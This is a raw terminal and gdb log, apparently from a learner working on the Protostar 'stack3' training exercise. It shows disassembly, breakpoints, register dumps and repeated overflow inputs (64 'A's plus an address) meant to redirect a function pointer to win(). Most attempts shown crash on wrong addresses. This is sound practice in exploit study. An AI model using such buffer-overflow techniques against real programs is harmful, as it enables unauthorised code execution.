user@protostar:/opt/protostar/bin$ gdb ./stack3
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) x win
0x8048424 <win>:        0x83e58955
(gdb) info functions
All defined functions:

File stack3/stack3.c:
int main(int, char **);
void win(void);

Non-debugging symbols:
0x080482e0  _init
0x08048320  __gmon_start__
0x08048320  __gmon_start__@plt
0x08048330  gets
0x08048330  gets@plt
0x08048340  __libc_start_main
0x08048340  __libc_start_main@plt
0x08048350  printf
0x08048350  printf@plt
0x08048360  puts
0x08048360  puts@plt
0x08048370  _start
0x080483a0  __do_global_dtors_aux
0x08048400  frame_dummy
0x08048480  __libc_csu_fini
0x08048490  __libc_csu_init
0x080484ea  __i686.get_pc_thunk.bx
0x080484f0  __do_global_ctors_aux
0x0804851c  _fini
(gdb) as given in hint find address of win() 
Undefined command: "as".  Try "help".
(gdb) x win
0x8048424 <win>:        0x83e58955
(gdb) p win
$1 = {void (void)} 0x8048424 <win>
(gdb) set disassamble-flavor intel 
No symbol "disassamble" in current context.
(gdb) set disassambly-flavor intel 
No symbol "disassambly" in current context.
(gdb) set disassembl-flavor intel 
No symbol "disassembl" in current context.
(gdb) set disassembly-flavor intel 
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:    push   ebp
0x08048439 <main+1>:    mov    ebp,esp
0x0804843b <main+3>:    and    esp,0xfffffff0
0x0804843e <main+6>:    sub    esp,0x60
0x08048441 <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:   lea    eax,[esp+0x1c]
0x0804844d <main+21>:   mov    DWORD PTR [esp],eax
0x08048450 <main+24>:   call   0x8048330 <gets@plt>
0x08048455 <main+29>:   cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    eax,0x8048560
0x08048461 <main+41>:   mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:   mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:   mov    DWORD PTR [esp],eax
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:   call   eax
0x08048477 <main+63>:   leave  
0x08048478 <main+64>:   ret    
End of assembler dump.
(gdb) b *0x08048475
Breakpoint 1 at 0x8048475: file stack3/stack3.c, line 22.
(gdb) r
Starting program: /opt/protostar/bin/stack3 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA^[[B
calling function pointer, jumping to 0x00425b1b

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff864) at stack3/stack3.c:22
22      stack3/stack3.c: No such file or directory.
        in stack3/stack3.c
(gdb) ^Z
[1]+  Stopped                 gdb ./stack3
user@protostar:/opt/protostar/bin$ python -c 'print "A"*(64)+"\x5c\x84\x04\x08"' | ./stack3
calling function pointer, jumping to 0x0804845c
calling function pointer, jumping to 0x41414141
Segmentation fault
user@protostar:/opt/protostar/bin$ gdb ./stack3
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) info function
All defined functions:

File stack3/stack3.c:
int main(int, char **);
void win(void);

Non-debugging symbols:
0x080482e0  _init
0x08048320  __gmon_start__
0x08048320  __gmon_start__@plt
0x08048330  gets
0x08048330  gets@plt
0x08048340  __libc_start_main
0x08048340  __libc_start_main@plt
0x08048350  printf
0x08048350  printf@plt
0x08048360  puts
0x08048360  puts@plt
0x08048370  _start
0x080483a0  __do_global_dtors_aux
0x08048400  frame_dummy
0x08048480  __libc_csu_fini
0x08048490  __libc_csu_init
0x080484ea  __i686.get_pc_thunk.bx
0x080484f0  __do_global_ctors_aux
0x0804851c  _fini
(gdb) p win
$1 = {void (void)} 0x8048424 <win>
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:    push   %ebp
0x08048439 <main+1>:    mov    %esp,%ebp
0x0804843b <main+3>:    and    $0xfffffff0,%esp
0x0804843e <main+6>:    sub    $0x60,%esp
0x08048441 <main+9>:    movl   $0x0,0x5c(%esp)
0x08048449 <main+17>:   lea    0x1c(%esp),%eax
0x0804844d <main+21>:   mov    %eax,(%esp)
0x08048450 <main+24>:   call   0x8048330 <gets@plt>
0x08048455 <main+29>:   cmpl   $0x0,0x5c(%esp)
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    $0x8048560,%eax
0x08048461 <main+41>:   mov    0x5c(%esp),%edx
0x08048465 <main+45>:   mov    %edx,0x4(%esp)
0x08048469 <main+49>:   mov    %eax,(%esp)
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    0x5c(%esp),%eax
0x08048475 <main+61>:   call   *%eax
0x08048477 <main+63>:   leave  
0x08048478 <main+64>:   ret    
End of assembler dump.
(gdb) set disa
disable-randomization  disassemble-next-line  disassembly-flavor
(gdb) set disa
disable-randomization  disassemble-next-line  disassembly-flavor
(gdb) set disassembly-flavor intel 
(gdb) b *0x08048475
Breakpoint 1 at 0x8048475: file stack3/stack3.c, line 22.
(gdb) r
Starting program: /opt/protostar/bin/stack3 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
calling function pointer, jumping to 0x41414141

Breakpoint 1, 0x08048475 in main (argc=65, argv=0xbffff864) at stack3/stack3.c:22
22      stack3/stack3.c: No such file or directory.
        in stack3/stack3.c
(gdb) info register
eax            0x41414141       1094795585
ecx            0x0      0
edx            0xb7fd9340       -1208118464
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff750       0xbffff750
ebp            0xbffff7b8       0xbffff7b8
esi            0x0      0
edi            0x0      0
eip            0x8048475        0x8048475 <main+61>
eflags         0x200296 [ PF AF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) ^CQuit
(gdb) ^Z
[2]+  Stopped                 gdb ./stack3
user@protostar:/opt/protostar/bin$ cd /tmp
user@protostar:/tmp$ vi stack3.py
user@protostar:/tmp$ python stack3.py 
  File "stack3.py", line 2
    print payload
                 ^
SyntaxError: invalid syntax
user@protostar:/tmp$ vi stack3.py
user@protostar:/tmp$ python stack3.py 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
user@protostar:/tmp$ python stack3.py >ext
user@protostar:/tmp$ cat ext
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
user@protostar:/tmp$ /opt/protostar/bin/stack3 < ext
calling function pointer, jumping to 0x42424242
Segmentation fault
user@protostar:/tmp$ chr(\0x42) = B
bash: syntax error near unexpected token `\0x42'
user@protostar:/tmp$ vi stack3.py

[No write since last change]
/bin/sh: q: not found

shell returned 127

Press ENTER or type command to continue
user@protostar:/tmp$ python stack3.py >ext
user@protostar:/tmp$ cat ext
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$�H�
user@protostar:/tmp$ /opt/protostar/bin/stack3 < ext
calling function pointer, jumping to 0x00804884
Segmentation fault
user@protostar:/tmp$ vi stack3.py
user@protostar:/tmp$ python stack3.py >ext
user@protostar:/tmp$ /opt/protostar/bin/stack3 < ext
calling function pointer, jumping to 0x00008048
Segmentation fault
user@protostar:/tmp$ vi stack3.py
user@protostar:/tmp$ python stack3.py >ext
user@protostar:/tmp$ /opt/protostar/bin/stack3 < ext
calling function pointer, jumping to 0x80488424
Segmentation fault
user@protostar:/tmp$ gdb /opt/protostar/bin/stack3
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) x win
0x8048424 <win>:        0x83e58955
(gdb) r < /tmp/ext 
Starting program: /opt/protostar/bin/stack3 < /tmp/ext
calling function pointer, jumping to 0x80488424

Program received signal SIGSEGV, Segmentation fault.
0x80488424 in ?? ()
(gdb) disassamble main
Undefined command: "disassamble".  Try "help".
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:    push   %ebp
0x08048439 <main+1>:    mov    %esp,%ebp
0x0804843b <main+3>:    and    $0xfffffff0,%esp
0x0804843e <main+6>:    sub    $0x60,%esp
0x08048441 <main+9>:    movl   $0x0,0x5c(%esp)
0x08048449 <main+17>:   lea    0x1c(%esp),%eax
0x0804844d <main+21>:   mov    %eax,(%esp)
0x08048450 <main+24>:   call   0x8048330 <gets@plt>
0x08048455 <main+29>:   cmpl   $0x0,0x5c(%esp)
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    $0x8048560,%eax
0x08048461 <main+41>:   mov    0x5c(%esp),%edx
0x08048465 <main+45>:   mov    %edx,0x4(%esp)
0x08048469 <main+49>:   mov    %eax,(%esp)
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    0x5c(%esp),%eax
0x08048475 <main+61>:   call   *%eax
0x08048477 <main+63>:   leave  
0x08048478 <main+64>:   ret    
End of assembler dump.
(gdb) b *0x08048475
Breakpoint 1 at 0x8048475: file stack3/stack3.c, line 22.
(gdb) r < /tmp/ext 
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/stack3 < /tmp/ext
calling function pointer, jumping to 0x80488424

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff864) at stack3/stack3.c:22
22      stack3/stack3.c: No such file or directory.
        in stack3/stack3.c
(gdb) info register
eax            0x80488424       -2142731228
ecx            0x0      0
edx            0xb7fd9340       -1208118464
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff750       0xbffff750
ebp            0xbffff7b8       0xbffff7b8
esi            0x0      0
edi            0x0      0
eip            0x8048475        0x8048475 <main+61>
eflags         0x200296 [ PF AF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x80488424 in ?? ()
(gdb) c
Continuing.

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) si
The program is not being run.
(gdb) r < /tmp/ext 
Starting program: /opt/protostar/bin/stack3 < /tmp/ext
calling function pointer, jumping to 0x80488424

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff864) at stack3/stack3.c:22
22      in stack3/stack3.c
(gdb) si
0x80488424 in ?? ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x80488424 in ?? ()
(gdb) x win
0x8048424 <win>:        0x83e58955
(gdb) c
Continuing.

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:    push   %ebp
0x08048439 <main+1>:    mov    %esp,%ebp
0x0804843b <main+3>:    and    $0xfffffff0,%esp
0x0804843e <main+6>:    sub    $0x60,%esp
0x08048441 <main+9>:    movl   $0x0,0x5c(%esp)
0x08048449 <main+17>:   lea    0x1c(%esp),%eax
0x0804844d <main+21>:   mov    %eax,(%esp)
0x08048450 <main+24>:   call   0x8048330 <gets@plt>
0x08048455 <main+29>:   cmpl   $0x0,0x5c(%esp)
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    $0x8048560,%eax
0x08048461 <main+41>:   mov    0x5c(%esp),%edx
0x08048465 <main+45>:   mov    %edx,0x4(%esp)
0x08048469 <main+49>:   mov    %eax,(%esp)
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    0x5c(%esp),%eax
0x08048475 <main+61>:   call   *%eax
0x08048477 <main+63>:   leave  
0x08048478 <main+64>:   ret    
End of assembler dump.
(gdb) set disassembly-flavor intel 
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:    push   ebp
0x08048439 <main+1>:    mov    ebp,esp
0x0804843b <main+3>:    and    esp,0xfffffff0
0x0804843e <main+6>:    sub    esp,0x60
0x08048441 <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:   lea    eax,[esp+0x1c]
0x0804844d <main+21>:   mov    DWORD PTR [esp],eax
0x08048450 <main+24>:   call   0x8048330 <gets@plt>
0x08048455 <main+29>:   cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    eax,0x8048560
0x08048461 <main+41>:   mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:   mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:   mov    DWORD PTR [esp],eax
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:   call   eax
0x08048477 <main+63>:   leave  
0x08048478 <main+64>:   ret    
End of assembler dump.
(gdb) b *0x08048475
Note: breakpoint 1 also set at pc 0x8048475.
Breakpoint 2 at 0x8048475: file stack3/stack3.c, line 22.
(gdb) r < /tmp/ext 
Starting program: /opt/protostar/bin/stack3 < /tmp/ext
calling function pointer, jumping to 0x80488424

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff864) at stack3/stack3.c:22
22      in stack3/stack3.c
(gdb) info register
eax            0x80488424       -2142731228
ecx            0x0      0
edx            0xb7fd9340       -1208118464
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff750       0xbffff750
ebp            0xbffff7b8       0xbffff7b8
esi            0x0      0
edi            0x0      0
eip            0x8048475        0x8048475 <main+61>
eflags         0x200296 [ PF AF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x80488424 in ?? ()
(gdb) 

